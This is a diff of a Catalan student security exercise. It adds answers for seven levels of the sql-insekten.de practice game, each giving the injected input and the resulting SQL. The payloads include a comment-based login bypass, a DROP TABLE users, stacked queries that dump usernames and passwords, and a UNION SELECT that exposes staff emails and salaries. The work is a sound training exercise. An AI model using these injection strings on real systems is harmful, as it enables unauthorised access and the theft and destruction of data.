@@ -17,8 +17,43 @@ Denegar per defecte els accesos als recursos, exceptuan els que hagin de ser pub
 
 
 ### 2. Obre el següent enllaç [(sql inseckten)](https://www.sql-insekten.de/) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 
-1. Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
-2. Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework. 
+### 2.1. Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
+#### Nivell 1:
+En l'espai per al nom d'usuari he posat: jane'; --  
+La sentencia resultant ha sigut: SELECT username FROM users WHERE username ='jane'; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
+He aconseguit accedir a l'usuari amb nom jane  
+
+#### Nivell 2:
+En l'espai per al nom d'usuari he posat: jane'; DROP TABLE users; --  
+La sentencia resultant ha sigut: SELECT username FROM users WHERE username ='jane'; DROP TABLE users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
+S'ha fet DROP a la taula users  
+
+#### Nivell 3:
+En l'espai per al nom d'usuari he posat: '; SELECT username FROM users; --  
+La sentencia resultant ha sigut: SELECT username FROM users WHERE username =''; SELECT username FROM users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
+A logat com maxmiller  
+
+#### Nivell 4:
+En l'espai pel nom d'usuari he posat: '; SELECT username FROM users LIMIT 1; --
+La sentencia resultant ha sigut: SELECT username FROM users WHERE username =''; SELECT username FROM users LIMIT 1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
+A logat com maxmiller  
+
+#### Nivell 5:
+En l'espai per la marca de les sabates:  '; SELECT username, password FROM users; --
+La sentencia resultant ha sigut: SELECT product_id, brand, size, price FROM shoes WHERE brand=''; SELECT username, password FROM users; --';  
+En la taula on hauria de mostrar les sabates m'ha mostrat els noms d'usuari i les respectives contrasenyes  
+
+#### Nivell 6:
+En l'espai pel nom d'usuari he posat: '; SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria'; --  
+La sentencia resultant ha sigut: SELECT username FROM users WHERE username =''; SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria'; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
+En la pantalla en que et dona la benvinguda per haber iniciat sessió mostra el salari on hi hauria d'haver el nom d'usuari  
+  
+#### Nivell 7:
+En l'espai: ' UNION SELECT firstname AS product_id, email AS brand, salary AS size, employed_since AS price FROM staff WHERE name = '' OR name != '  
+La sentencia resultant ha sigut: SELECT product_id, brand, size, price FROM shoes WHERE brand='' UNION SELECT firstname AS product_id, email AS brand, salary AS size, employed_since AS price FROM staff WHERE name = '' OR name != '';  
+En la tula on mostraria l'informació dels productes mostra la informació dels empleats  
+  
+### 2.2. Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework. 
 
 ### 3. L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.
 
